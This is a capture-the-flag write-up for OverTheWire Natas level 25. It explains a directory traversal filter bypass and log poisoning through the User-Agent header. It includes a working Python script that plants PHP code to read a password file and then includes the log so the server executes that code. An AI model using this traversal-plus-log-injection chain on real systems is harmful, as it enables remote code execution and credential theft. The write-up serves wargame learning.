# natas25

This problem deals with a new concept.<br>
The Natas25 challenge involves exploiting two vulnerabilities: Directory Traversal and Log Poisoning.
1. **Directory Traversal:** This is a vulnerability that allows an attacker to read arbitrary files on the server's file system. In this challenge, the application includes a language file specified by the lang parameter in the response. By using a relative path like `....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_`, we can escape from the current directory and read files from other directories.

2. **Log Poisoning:** This is a vulnerability that allows an attacker to inject malicious content into a system's log files. In this challenge, the application logs the user agent string of each request. By setting the user agent string to PHP code, we can inject this code into the log file. When the log file is included in the response, the server executes this code.

The solution to this challenge involves combining these two vulnerabilities.<br> 
- First, we inject PHP code into the user agent string that reads the password for the next level.
- Then, we use directory traversal to include the log file in the response. When the server includes the log file, it executes the injected PHP code, revealing the password for the next level.

You can either use python or Barpsuite for this. The below is the code you can use for python-
```python
import requests

# URL for the site
url = 'http://natas25.natas.labs.overthewire.org/'

auth = ('natas25', '<password>')  # replace with the actual password

# Create a session
session = requests.Session()
session.auth = auth

# Set the user agent to include PHP code
session.headers['User-Agent'] = '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
session.get(url)

if 'PHPSESSID' not in session.cookies:
    # Manually set the PHPSESSID cookie
    session.cookies['PHPSESSID'] = '<cookie-value>'
# Make a GET request to the site with the lang parameter set to include the log file
response = session.get(url, params={'lang': '....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'})

# Print the response
print(response.text)
```
We didnt use `/etc/natas_webpass/natas26` since the source code filters out the results and we are even given with what we can inject to get our password which is the above `var/...`. Also usually to get `/etc/passwd`, we do 5 `../` in sequence(just a general trend, it may also be different), but since we cant use `../` directly, we used `....//` which converts itself too `../` according to source code and we are done.